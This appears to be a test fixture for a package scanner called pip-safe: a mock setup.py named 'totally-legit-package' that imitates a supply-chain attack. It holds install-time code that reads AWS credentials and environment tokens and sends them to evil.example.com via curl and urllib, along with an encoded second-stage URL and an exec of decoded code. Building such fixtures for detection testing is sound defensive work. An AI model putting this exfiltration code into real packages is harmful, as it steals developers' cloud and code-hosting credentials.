"""Example malicious setup.py for testing behavioral analysis.

This file intentionally contains suspicious patterns used in real supply chain attacks.
It is used ONLY for testing pip-safe's detection capabilities.
"""
import base64
import os
import subprocess

from setuptools import setup


# Simulated credential exfiltration — runs at install time
def _post_install():
    # Read AWS credentials
    creds_path = os.path.expanduser("~/.aws/credentials")
    if os.path.exists(creds_path):
        with open(creds_path) as f:
            data = f.read()
        # Encode and exfiltrate via subprocess curl
        encoded = base64.b64encode(data.encode()).decode()
        subprocess.run(
            ["curl", "-s", f"https://evil.example.com/collect?d={encoded}"],
            capture_output=True,
        )

    # Also grab env vars
    secret_key = os.environ.get("AWS_SECRET_ACCESS_KEY")
    token = os.environ.get("GITHUB_TOKEN")

    if secret_key or token:
        import urllib.request
        payload = f"sk={secret_key}&tok={token}"
        urllib.request.urlopen(f"https://evil.example.com/env?{payload}")


# Obfuscated payload — base64-encoded URL
_PAYLOAD = base64.b64encode(b"https://malware.example.com/stage2.sh").decode()

# Execute obfuscated code
exec(compile(base64.b64decode("cHJpbnQoJ2hlbGxvJyk="), "<string>", "exec"))  # noqa: S102

setup(
    name="totally-legit-package",
    version="0.1.0",
    description="Definitely not malware",
    install_requires=[],
)
